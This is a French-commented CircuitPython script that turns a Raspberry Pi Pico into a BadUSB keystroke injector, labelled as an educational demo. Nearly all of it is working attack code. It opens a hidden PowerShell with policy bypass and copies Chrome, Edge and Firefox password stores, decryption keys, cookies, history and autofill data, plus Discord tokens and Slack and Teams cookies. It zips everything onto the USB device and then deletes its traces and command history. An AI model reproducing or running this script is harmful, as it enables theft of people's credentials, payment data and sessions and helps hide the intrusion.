"""
Raspberry Pi Pico - BadUSB Demo 5: Vol de Credentials
======================================================

AVERTISSEMENT LÉGAL:
Ce script est fourni à des fins éducatives et de sensibilisation uniquement.

Description:
Vol de mots de passe navigateurs, cookies, tokens
Compatible clavier AZERTY français

Durée: ~12 secondes
Impact: CRITIQUE - Vol de credentials

Ce script démontre:
- Vol de mots de passe de TOUS les navigateurs
- Vol de cookies (session hijacking)
- Vol de tokens Discord/Slack/Teams
- Exfiltration complète des credentials

Données collectées:
- Mots de passe Chrome (base Login Data)
- Mots de passe Edge
- Mots de passe Firefox (logins.json + clé de déchiffrement)
- Cookies de tous les navigateurs
- Historique de navigation
- Données autofill (cartes de crédit potentielles)
- Tokens Discord
- Cookies Slack et Teams

Exfiltration:
- CIRCUITPY/exfil/ (fichiers individuels)
- CIRCUITPY/exfil/credentials_YYYYMMDD_HHMMSS.zip
- Desktop/CREDENTIALS_STOLEN.zip
"""

# ============================================================================
# IMPORTS
# ============================================================================
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_fr import KeyboardLayout
from keycode_win_fr import Keycode

# ============================================================================
# INITIALISATION
# ============================================================================
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

# ============================================================================
# FONCTIONS UTILITAIRES
# ============================================================================

def press_combo(*keys):
    """Appuie sur une combinaison de touches"""
    keyboard.press(*keys)
    time.sleep(0.1)
    keyboard.release_all()
    time.sleep(0.1)

def press_enter():
    """Appuie sur Entrée"""
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.3)

# ============================================================================
# SCRIPT PRINCIPAL
# ============================================================================

# Attendre la reconnaissance du périphérique
time.sleep(2)

# Étape 1: Ouvrir PowerShell INVISIBLE
press_combo(Keycode.WINDOWS, Keycode.R)
time.sleep(0.8)
layout.write("powershell -W Hidden -NoP -Exec Bypass")
press_enter()
time.sleep(1.5)

# Étape 2: Commandes de vol de credentials
commands = [
    # Créer dossier temporaire avec nom aléatoire
    "$out=$env:TEMP+'\\creds_'+[guid]::NewGuid().ToString().Substring(0,8);",
    "mkdir $out|Out-Null;",
    
    # CHROME - Mots de passe (CRITIQUE)
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data' $out\\chrome_passwords.db -EA SilentlyContinue};",
    
    # CHROME - Cookies (SESSION HIJACKING)
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies' $out\\chrome_cookies.db -EA SilentlyContinue};",
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies' $out\\chrome_cookies_new.db -EA SilentlyContinue};",
    
    # CHROME - Historique
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History' $out\\chrome_history.db -EA SilentlyContinue};",
    
    # CHROME - Autofill (cartes de crédit potentielles)
    "if(Test-Path '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Web Data'){Copy-Item '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Web Data' $out\\chrome_autofill.db -EA SilentlyContinue};",
    
    # EDGE - Mots de passe
    "if(Test-Path '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data'){Copy-Item '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data' $out\\edge_passwords.db -EA SilentlyContinue};",
    
    # FIREFOX - Mots de passe + clé de déchiffrement
    "$ffProfiles=Get-ChildItem '$env:APPDATA\\Mozilla\\Firefox\\Profiles' -EA SilentlyContinue;",
    "if($ffProfiles){",
    "    $ffProfile=$ffProfiles[0].FullName;",
    "    if(Test-Path \"$ffProfile\\logins.json\"){Copy-Item \"$ffProfile\\logins.json\" $out\\ff_logins.json -EA SilentlyContinue};",
    "    if(Test-Path \"$ffProfile\\key4.db\"){Copy-Item \"$ffProfile\\key4.db\" $out\\ff_key.db -EA SilentlyContinue};",
    "    if(Test-Path \"$ffProfile\\cookies.sqlite\"){Copy-Item \"$ffProfile\\cookies.sqlite\" $out\\ff_cookies.db -EA SilentlyContinue};",
    "    if(Test-Path \"$ffProfile\\places.sqlite\"){Copy-Item \"$ffProfile\\places.sqlite\" $out\\ff_history.db -EA SilentlyContinue};",
    "};",
    
    # DISCORD - Tokens (accès aux comptes)
    "$discordPaths=@('$env:APPDATA\\discord\\Local Storage\\leveldb','$env:APPDATA\\discordcanary\\Local Storage\\leveldb','$env:APPDATA\\discordptb\\Local Storage\\leveldb');",
    "foreach($p in $discordPaths){if(Test-Path $p){mkdir $out\\discord_tokens -EA SilentlyContinue;Copy-Item $p\\*.ldb $out\\discord_tokens\\ -EA SilentlyContinue}};",
    
    # SLACK & TEAMS - Cookies
    "if(Test-Path '$env:APPDATA\\Slack\\Cookies'){Copy-Item '$env:APPDATA\\Slack\\Cookies' $out\\slack_cookies.db -EA SilentlyContinue};",
    "if(Test-Path '$env:APPDATA\\Microsoft\\Teams\\Cookies'){Copy-Item '$env:APPDATA\\Microsoft\\Teams\\Cookies' $out\\teams_cookies.db -EA SilentlyContinue};",
    
    # Informations système
    "\"Hostname: $env:COMPUTERNAME\"|Out-File $out\\info.txt;",
    "\"Username: $env:USERNAME\"|Out-File $out\\info.txt -Append;",
    "\"Domain: $env:USERDOMAIN\"|Out-File $out\\info.txt -Append;",
    "\"Date: $(Get-Date)\"|Out-File $out\\info.txt -Append;",
    
    # Détecter le Pico
    "$usb=(gwmi win32_volume|?{$_.Label -eq 'CIRCUITPY' -or $_.Label -eq 'RPI-RP2'}).DriveLetter;",
    'if($usb){if(!(Test-Path "$usb\\exfil")){mkdir "$usb\\exfil" | Out-Null}};',
    
    # Exfiltrer vers le Pico
    'if($usb){Copy-Item $out\\* "$usb\\exfil\\" -Recurse -Force -EA SilentlyContinue};',
    'if($usb){Compress-Archive -Path $out\\* -DestinationPath "$usb\\exfil\\credentials_$(Get-Date -Format "yyyyMMdd_HHmmss").zip" -CompressionLevel Fastest -EA SilentlyContinue};',
    
    # Copie sur le bureau (pour démo)
    "Compress-Archive -Path $out\\* -DestinationPath $env:USERPROFILE\\Desktop\\CREDENTIALS_STOLEN.zip -EA SilentlyContinue;",
    
    # Nettoyage des traces
    "Start-Sleep -Seconds 1;",
    "Remove-Item -Recurse -Force $out -EA SilentlyContinue;",
    "Clear-History;",
    "exit"
]

# Étape 3: Exécuter les commandes de vol
for cmd in commands:
    layout.write(cmd)
    press_enter()
    time.sleep(0.15)  # Délai minimal
